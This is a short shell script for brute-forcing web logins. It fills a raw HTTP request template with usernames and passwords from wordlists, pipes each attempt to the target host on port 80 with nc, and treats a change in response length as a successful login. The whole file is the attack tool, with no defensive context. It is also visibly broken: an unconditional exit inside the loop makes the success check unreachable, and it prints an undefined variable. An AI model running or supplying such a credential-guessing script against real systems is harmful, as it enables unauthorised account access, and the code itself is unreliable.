#!/bin/sh

content=`cat $2`

# Usernames
for username in $(cat $3); do

	# Passwords
	for password in $(cat $4); do

		echo -n "$username:$password:"
		result=`echo "$content" | sed s/@1/$username/ | sed s/@2/$password/ | nc $1 80 | wc -c | tr -d ' '`
		result=`echo "$content" | sed s/@1/$username/ | sed s/@2/$password/ | nc $1 80`
		echo "$result"
		echo
echo "$content" | sed s/@1/$username/ | sed s/@2/$password/
exit

		if [ $result -ne $5 ]
		then
			echo "FINISHED!"
			echo "'$repl' seems to be the correct input."
			exit
		fi

	done

done

